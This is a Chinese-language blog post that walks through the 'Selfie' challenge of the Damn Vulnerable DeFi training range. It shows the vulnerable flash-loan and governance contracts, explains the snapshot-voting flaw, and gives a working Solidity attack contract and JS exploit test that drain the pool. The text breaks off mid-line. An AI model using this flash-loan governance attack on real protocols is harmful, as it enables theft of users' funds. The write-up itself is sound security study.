<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.2">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="DamnVulnerableDeFi">
<meta property="og:type" content="article">
<meta property="og:title" content="DamnVulnerableDeFi靶场实战(6-10)">
<meta property="og:url" content="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-6-10/index.html">
<meta property="og:site_name" content="lucifer&#39;s blog">
<meta property="og:description" content="DamnVulnerableDeFi">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://img-blog.csdnimg.cn/ac027ba6726742d8821b08eb1a12d84d.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/c04458224f654e9faaf8d293f1389f69.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/d9ac73283f3f48fcb64434611d49e187.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/4a6c008097d648518ea50ebe594a5631.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/33b8ca619b294913a44fd5c6d9a8950a.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/3b9c1edef5b54dc0a234624cea7b3410.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/35cf686ff23347e4998dce524e8d72a0.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/f4cdf736f39e4a0398935da276ca463a.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/e2fc94df8c9841879d4c6ab168d35b75.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/07bd6c207b444d5fa16356ee2e182364.png">
<meta property="article:published_time" content="2022-12-01T06:32:57.000Z">
<meta property="article:modified_time" content="2022-12-01T07:10:39.510Z">
<meta property="article:author" content="lucifer">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://img-blog.csdnimg.cn/ac027ba6726742d8821b08eb1a12d84d.png">

<link rel="canonical" href="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-6-10/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>DamnVulnerableDeFi靶场实战(6-10) | lucifer's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">lucifer's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-schedule">

    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/01/DamnVulnerableDeFi%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98-6-10/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lucifer">
      <meta itemprop="description" content="我的老婆严菡是猪">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lucifer's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          DamnVulnerableDeFi靶场实战(6-10)
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-12-01 14:32:57 / 修改时间：15:10:39" itemprop="dateCreated datePublished" datetime="2022-12-01T14:32:57+08:00">2022-12-01</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/DamnVulnerableDeFi/" itemprop="url" rel="index"><span itemprop="name">DamnVulnerableDeFi</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>33k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>30 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <p>DamnVulnerableDeFi<br> <span id="more"></span><br>@<a href="%E9%A2%98%E7%9B%AE%E9%A2%84%E8%A7%88">TOC</a></p>
<h1 id="Selfie"><a href="#Selfie" class="headerlink" title="Selfie"></a>Selfie</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目要求：</p>
<blockquote>
<p>A new cool lending pool has launched! It’s now offering flash loans of<br>DVT tokens.</p>
<p>Wow, and it even includes a really fancy governance mechanism to<br>control it.</p>
<p>What could go wrong, right ?</p>
<p>You start with no DVT tokens in balance, and the pool has 1.5 million.<br>Your objective: take them all.</p>
</blockquote>
<p>大意是有一个提供DVT代币的闪电贷，池中有一百五十万个DVT，而我们一无所有，但我们需要拿走全部的DVT.<br>题目给了两个合约，一个是闪电贷合约，另一个是闪电贷的治理合约<br>闪电贷合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/security/ReentrancyGuard.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SimpleGovernance.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">SelfiePool</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">SelfiePool</span> is <span class="title class_">ReentrancyGuard</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">ERC20Snapshot</span> public token;</span><br><span class="line">    <span class="title class_">SimpleGovernance</span> public governance;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">FundsDrained</span>(address indexed receiver, uint256 amount);</span><br><span class="line"></span><br><span class="line">    modifier <span class="title function_">onlyGovernance</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span> == <span class="title function_">address</span>(governance), <span class="string">&quot;Only governance can execute this action&quot;</span>);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address tokenAddress, address governanceAddress</span>) &#123;</span><br><span class="line">        token = <span class="title class_">ERC20Snapshot</span>(tokenAddress);</span><br><span class="line">        governance = <span class="title class_">SimpleGovernance</span>(governanceAddress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">flashLoan</span>(<span class="params">uint256 borrowAmount</span>) external nonReentrant &#123;</span><br><span class="line">        uint256 balanceBefore = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        <span class="built_in">require</span>(balanceBefore &gt;= borrowAmount, <span class="string">&quot;Not enough tokens in pool&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>, borrowAmount);        </span><br><span class="line">        </span><br><span class="line">        <span class="built_in">require</span>(msg.<span class="property">sender</span>.<span class="title function_">isContract</span>(), <span class="string">&quot;Sender must be a deployed contract&quot;</span>);</span><br><span class="line">        msg.<span class="property">sender</span>.<span class="title function_">functionCall</span>(</span><br><span class="line">            abi.<span class="title function_">encodeWithSignature</span>(</span><br><span class="line">                <span class="string">&quot;receiveTokens(address,uint256)&quot;</span>,</span><br><span class="line">                <span class="title function_">address</span>(token),</span><br><span class="line">                borrowAmount</span><br><span class="line">            )</span><br><span class="line">        );</span><br><span class="line">        </span><br><span class="line">        uint256 balanceAfter = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">require</span>(balanceAfter &gt;= balanceBefore, <span class="string">&quot;Flash loan hasn&#x27;t been paid back&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">drainAllFunds</span>(<span class="params">address receiver</span>) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">        token.<span class="title function_">transfer</span>(receiver, amount);</span><br><span class="line">        </span><br><span class="line">        emit <span class="title class_">FundsDrained</span>(receiver, amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个合约只有两个函数，一个函数用来进行闪电贷，在其中触发我们的receiveTokens函数，另一个函数只有治理合约能够调用，用来向其他合约转钱。<br>治理合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableTokenSnapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> <span class="variable">SimpleGovernance</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">SimpleGovernance</span> &#123;</span><br><span class="line"></span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line">    </span><br><span class="line">    struct <span class="title class_">GovernanceAction</span> &#123;</span><br><span class="line">        address receiver;</span><br><span class="line">        bytes data;</span><br><span class="line">        uint256 weiAmount;</span><br><span class="line">        uint256 proposedAt;</span><br><span class="line">        uint256 executedAt;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title class_">DamnValuableTokenSnapshot</span> public governanceToken;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">uint256</span> =&gt;</span> <span class="title class_">GovernanceAction</span>) public actions;</span><br><span class="line">    uint256 private actionCounter;</span><br><span class="line">    uint256 private <span class="variable constant_">ACTION_DELAY_IN_SECONDS</span> = <span class="number">2</span> days;</span><br><span class="line"></span><br><span class="line">    event <span class="title class_">ActionQueued</span>(uint256 actionId, address indexed caller);</span><br><span class="line">    event <span class="title class_">ActionExecuted</span>(uint256 actionId, address indexed caller);</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address governanceTokenAddress</span>) &#123;</span><br><span class="line">        <span class="built_in">require</span>(governanceTokenAddress != <span class="title function_">address</span>(<span class="number">0</span>), <span class="string">&quot;Governance token cannot be zero address&quot;</span>);</span><br><span class="line">        governanceToken = <span class="title class_">DamnValuableTokenSnapshot</span>(governanceTokenAddress);</span><br><span class="line">        actionCounter = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">queueAction</span>(<span class="params">address receiver, bytes calldata data, uint256 weiAmount</span>) external returns (uint256) &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">_hasEnoughVotes</span>(msg.<span class="property">sender</span>), <span class="string">&quot;Not enough votes to propose an action&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(receiver != <span class="title function_">address</span>(<span class="variable language_">this</span>), <span class="string">&quot;Cannot queue actions that affect Governance&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uint256 actionId = actionCounter;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">GovernanceAction</span> storage actionToQueue = actions[actionId];</span><br><span class="line">        actionToQueue.<span class="property">receiver</span> = receiver;</span><br><span class="line">        actionToQueue.<span class="property">weiAmount</span> = weiAmount;</span><br><span class="line">        actionToQueue.<span class="property">data</span> = data;</span><br><span class="line">        actionToQueue.<span class="property">proposedAt</span> = block.<span class="property">timestamp</span>;</span><br><span class="line"></span><br><span class="line">        actionCounter++;</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">ActionQueued</span>(actionId, msg.<span class="property">sender</span>);</span><br><span class="line">        <span class="keyword">return</span> actionId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">executeAction</span>(<span class="params">uint256 actionId</span>) external payable &#123;</span><br><span class="line">        <span class="built_in">require</span>(<span class="title function_">_canBeExecuted</span>(actionId), <span class="string">&quot;Cannot execute this action&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">GovernanceAction</span> storage actionToExecute = actions[actionId];</span><br><span class="line">        actionToExecute.<span class="property">executedAt</span> = block.<span class="property">timestamp</span>;</span><br><span class="line"></span><br><span class="line">        actionToExecute.<span class="property">receiver</span>.<span class="title function_">functionCallWithValue</span>(</span><br><span class="line">            actionToExecute.<span class="property">data</span>,</span><br><span class="line">            actionToExecute.<span class="property">weiAmount</span></span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit <span class="title class_">ActionExecuted</span>(actionId, msg.<span class="property">sender</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getActionDelay</span>(<span class="params"></span>) public view returns (uint256) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">ACTION_DELAY_IN_SECONDS</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@dev</span> an action can only be executed if:</span></span><br><span class="line"><span class="comment">     * 1) it&#x27;s never been executed before and</span></span><br><span class="line"><span class="comment">     * 2) enough time has passed since it was first proposed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_canBeExecuted</span>(<span class="params">uint256 actionId</span>) private view returns (bool) &#123;</span><br><span class="line">        <span class="title class_">GovernanceAction</span> memory actionToExecute = actions[actionId];</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            actionToExecute.<span class="property">executedAt</span> == <span class="number">0</span> &amp;&amp;</span><br><span class="line">            (block.<span class="property">timestamp</span> - actionToExecute.<span class="property">proposedAt</span> &gt;= <span class="variable constant_">ACTION_DELAY_IN_SECONDS</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">_hasEnoughVotes</span>(<span class="params">address account</span>) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = governanceToken.<span class="title function_">getBalanceAtLastSnapshot</span>(account);</span><br><span class="line">        uint256 halfTotalSupply = governanceToken.<span class="title function_">getTotalSupplyAtLastSnapshot</span>() / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这个合约有两个函数，第一个函数的意思是，当你拥有了矿池中半数以上的DVT代币后，你就能够通过这个合约执行一次调用操作，queueAction函数会验证你是否拥有足够的token，如果有则将你想要执行的调用存入链上，在两天之后输入你的id即可在executeAction中执行该调用。</p>
<p>很明显，我们需要存入并且执行调用，我们可以在executeAction函数中去执行闪电贷合约中的drainAllFunds函数，这样即可绕开onlyGovernance的限定，将闪电贷合约中的token全部发送给我们，掏空该合约。</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../DamnValuableTokenSnapshot.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;@openzeppelin/contracts/utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SelfiePool.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./SimpleGovernance.sol&quot;</span>;</span><br><span class="line">contract selfieAttack&#123;</span><br><span class="line">    using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line">    <span class="title class_">SelfiePool</span> public pool;</span><br><span class="line">    <span class="title class_">SimpleGovernance</span> governance;</span><br><span class="line">    <span class="title class_">DamnValuableTokenSnapshot</span> token;</span><br><span class="line">    bytes data;</span><br><span class="line">    uint256 acountID;</span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">address _pool,address _governance,address attacker,address _token</span>)&#123;</span><br><span class="line">        pool = <span class="title class_">SelfiePool</span>(_pool);</span><br><span class="line">        governance = <span class="title class_">SimpleGovernance</span>(_governance);</span><br><span class="line">        token = <span class="title class_">DamnValuableTokenSnapshot</span>(_token);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loan</span>(<span class="params">uint256 amount,bytes memory _data</span>)public payable&#123;</span><br><span class="line">        data = _data;</span><br><span class="line">        pool.<span class="title function_">flashLoan</span>(amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">receiveTokens</span>(<span class="params">address _token,uint256 amount</span>)public&#123;</span><br><span class="line">        token.<span class="title function_">snapshot</span>();</span><br><span class="line">        acountID = governance.<span class="title function_">queueAction</span>(<span class="title function_">address</span>(pool),data,<span class="number">0</span>);</span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>,amount);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">complete</span>(<span class="params"></span>)public&#123;</span><br><span class="line">        governance.<span class="title function_">executeAction</span>(acountID);</span><br><span class="line">        token.<span class="title function_">transfer</span>(msg.<span class="property">sender</span>,token.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_">fallback</span>()external payable&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击原理很简单，先闪电贷借出全部的token，然后再receiveTokens函数中调用queueAction函数，将构造好的data和闪电贷合约地址传入，然后将钱返还给闪电贷合约。最后调用complete函数，执行executeAction函数，将钱转入我们的账户。<br>js攻击合约：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">it</span>(<span class="string">&#x27;Exploit&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="comment">/** CODE YOUR EXPLOIT HERE */</span></span><br><span class="line">        <span class="keyword">const</span> data = web3.<span class="property">eth</span>.<span class="property">abi</span>.<span class="title function_">encodeFunctionCall</span>(</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="attr">name</span>:<span class="string">&#x27;drainAllFunds&#x27;</span>,</span><br><span class="line">                <span class="attr">type</span>:<span class="string">&#x27;function&#x27;</span>,</span><br><span class="line">                <span class="attr">inputs</span>:[&#123;</span><br><span class="line">                    <span class="attr">type</span>:<span class="string">&#x27;address&#x27;</span>,</span><br><span class="line">                    <span class="attr">name</span>:<span class="string">&#x27;receiver&#x27;</span></span><br><span class="line"></span><br><span class="line">                &#125;]</span><br><span class="line">            &#125;,[attacker.<span class="property">address</span>]);</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">SelfieAttackFactory</span> = <span class="keyword">await</span> ethers.<span class="title function_">getContractFactory</span>(<span class="string">&quot;selfieAttack&quot;</span>,attacker);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">attack</span> =<span class="keyword">await</span> <span class="title class_">SelfieAttackFactory</span>.<span class="title function_">deploy</span>(<span class="variable language_">this</span>.<span class="property">pool</span>.<span class="property">address</span>,<span class="variable language_">this</span>.<span class="property">governance</span>.<span class="property">address</span>,attacker.<span class="property">address</span>,<span class="variable language_">this</span>.<span class="property">token</span>.<span class="property">address</span>);</span><br><span class="line">        <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="property">attack</span>.<span class="title function_">connect</span>(attacker).<span class="title function_">loan</span>(<span class="variable constant_">TOKENS_IN_POOL</span>,data);</span><br><span class="line">        <span class="keyword">await</span> ethers.<span class="property">provider</span>.<span class="title 